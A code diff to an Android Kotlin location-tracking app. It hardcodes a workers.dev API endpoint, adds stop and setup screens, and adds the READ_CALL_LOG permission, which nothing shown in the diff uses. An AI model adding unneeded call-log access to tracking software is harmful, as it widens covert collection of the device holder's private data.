@@ -15,6 +15,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var binding: ActivityMainBinding
     private val PREFS_NAME = "TrackerIDPrefs"
     private val PERMISSION_REQUEST = 1001
+    private val API_BASE = "https://tsp.omaromartest12.workers.dev"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -23,36 +24,44 @@ class MainActivity : AppCompatActivity() {
 
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         val savedCode = prefs.getString("tracking_code", null)
-        val savedApi = prefs.getString("api_base", null)
 
-        if (savedCode != null && savedCode.length == 6 && savedApi != null && savedApi.isNotEmpty()) {
-            fillCode(savedCode)
-            binding.apiUrlInput.setText(savedApi)
+        if (savedCode != null && savedCode.length == 6) {
             startTracking(savedCode)
             return
         }
 
         setupCodeInputs()
         binding.connectButton.isEnabled = false
-
-        binding.apiUrlInput.addTextChangedListener(object : android.text.TextWatcher {
-            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
-            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
-                updateConnectButton(listOf())
-            }
-            override fun afterTextChanged(s: android.text.Editable?) {}
-        })
-
         binding.connectButton.setOnClickListener {
             val code = getCodeFromInputs()
-            val apiBase = binding.apiUrlInput.text.toString().trim().trimEnd('/')
-            if (code.length == 6 && apiBase.isNotEmpty()) {
-                prefs.edit().putString("tracking_code", code).putString("api_base", apiBase).apply()
+            if (code.length == 6) {
+                prefs.edit().putString("tracking_code", code).apply()
                 startTracking(code)
             }
         }
 
+        binding.stopButton.setOnClickListener {
+            prefs.edit().remove("tracking_code").apply()
+            stopService(Intent(this, LocationService::class.java))
+            showSetupUI()
+        }
+
         checkPermissions()
+    }
+
+    private fun showSetupUI() {
+        binding.setupSection.alpha = 1f
+        binding.setupSection.isEnabled = true
+        binding.setupSection.visibility = android.view.View.VISIBLE
+        binding.activeSection.visibility = android.view.View.GONE
+        binding.code1.setText("")
+        binding.code2.setText("")
+        binding.code3.setText("")
+        binding.code4.setText("")
+        binding.code5.setText("")
+        binding.code6.setText("")
+        binding.connectButton.isEnabled = false
+        binding.code1.requestFocus()
     }
 
     private fun setupCodeInputs() {
@@ -68,21 +77,12 @@ class MainActivity : AppCompatActivity() {
                     if (s?.length == 1 && i < 5) {
                         editTexts[i + 1].requestFocus()
                     }
-                    updateConnectButton(editTexts)
+                    val code = editTexts.joinToString("") { it.text.toString() }
+                    binding.connectButton.isEnabled = code.length == 6
                 }
                 override fun afterTextChanged(s: android.text.Editable?) {}
             })
         }
-    }
-
-    private fun updateConnectButton(editTexts: List<android.widget.EditText> = listOf()) {
-        val code = if (editTexts.isNotEmpty()) {
-            editTexts.joinToString("") { it.text.toString() }
-        } else {
-            getCodeFromInputs()
-        }
-        val apiBase = binding.apiUrlInput.text.toString().trim()
-        binding.connectButton.isEnabled = code.length == 6 && apiBase.isNotEmpty()
     }
 
     private fun getCodeFromInputs(): String {
@@ -92,33 +92,23 @@ class MainActivity : AppCompatActivity() {
         ).joinToString("") { it.text.toString() }
     }
 
-    private fun fillCode(code: String) {
-        val chars = code.toCharArray()
-        val editTexts = listOf(
-            binding.code1, binding.code2, binding.code3,
-            binding.code4, binding.code5, binding.code6
-        )
-        for (i in chars.indices) {
-            if (i < editTexts.size) editTexts[i].setText(chars[i].toString())
-        }
-    }
-
     private fun startTracking(code: String) {
         val intent = Intent(this, LocationService::class.java).apply {
             putExtra("tracking_code", code)
         }
         ContextCompat.startForegroundService(this, intent)
-        binding.statusText.text = getString(R.string.tracking_active)
-        binding.statusText.setTextColor(android.graphics.Color.parseColor("#00ff88"))
-        binding.codeSection.alpha = 0.5f
-        Toast.makeText(this, getString(R.string.tracking_started, code), Toast.LENGTH_LONG).show()
+
+        binding.setupSection.visibility = android.view.View.GONE
+        binding.activeSection.visibility = android.view.View.VISIBLE
+        binding.activeCode.text = "Code: $code"
     }
 
     private fun checkPermissions() {
         val permissions = mutableListOf(
             Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.POST_NOTIFICATIONS
+            Manifest.permission.POST_NOTIFICATIONS,
+            Manifest.permission.READ_CALL_LOG
         )
 
         val needed = permissions.filter {
